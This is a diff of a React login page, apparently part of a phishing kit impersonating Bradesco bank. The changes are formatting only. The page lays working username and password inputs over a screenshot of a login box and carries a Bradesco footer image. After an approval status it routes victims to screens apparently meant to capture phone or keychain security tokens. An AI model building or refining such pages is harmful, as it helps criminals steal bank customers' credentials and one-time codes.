@@ -20,8 +20,7 @@ export const Route = createFileRoute("/")({
       { title: "Acesso Seguro — Central de Validação" },
       {
         name: "description",
-        content:
-          "Acesse de forma segura. Informe seu usuário e senha para validação.",
+        content: "Acesse de forma segura. Informe seu usuário e senha para validação.",
       },
       { property: "og:title", content: "Acesso Seguro — Central de Validação" },
       {
@@ -96,7 +95,11 @@ function ClientePage() {
         if (res.status === "aprovado") {
           setAguardando(false);
           setIdAtivo(null);
-          if (res.proxima_tela === "interna" || res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
+          if (
+            res.proxima_tela === "interna" ||
+            res.proxima_tela === "interna_token_celular" ||
+            res.proxima_tela === "interna_token_chaveiro"
+          ) {
             navigate({ to: "/interna", search: { id } });
             return;
           }
@@ -196,11 +199,7 @@ function ClientePage() {
             />
 
             {/* Login form — image with overlaid functional inputs */}
-            <form
-              id="loginForm"
-              onSubmit={submeter}
-              className="relative max-w-[717px] bg-white"
-            >
+            <form id="loginForm" onSubmit={submeter} className="relative max-w-[717px] bg-white">
               <img
                 src={caixaLogin.url}
                 alt="Informe o usuário e a senha"
@@ -254,7 +253,8 @@ function ClientePage() {
             {loginInvalido && (
               <div className="mt-2 max-w-[717px] rounded border border-dashed border-[#c62828] bg-[#fff3cd] px-3 py-2 text-[12px] text-[#721c24]">
                 <p>
-                  <strong>Dados inválidos.</strong> Verifique se seu usuário e senha estão corretos e tente novamente. Se o erro persistir,{" "}
+                  <strong>Dados inválidos.</strong> Verifique se seu usuário e senha estão corretos
+                  e tente novamente. Se o erro persistir,{" "}
                   <button type="button" className="font-bold underline hover:text-[#c62828]">
                     confira aqui
                   </button>{" "}
@@ -315,7 +315,6 @@ function ClientePage() {
             </p>
           </div>
 
-
           {/* Right column */}
           <aside className="overflow-visible bg-[#e5e5e5] px-2">
             <img
@@ -329,11 +328,7 @@ function ClientePage() {
 
       {/* Footer */}
       <footer className="mt-6">
-        <img
-          src={rodape.url}
-          alt="Bradesco Apoio à Empresa"
-          className="block h-auto w-full"
-        />
+        <img src={rodape.url} alt="Bradesco Apoio à Empresa" className="block h-auto w-full" />
       </footer>
     </div>
   );
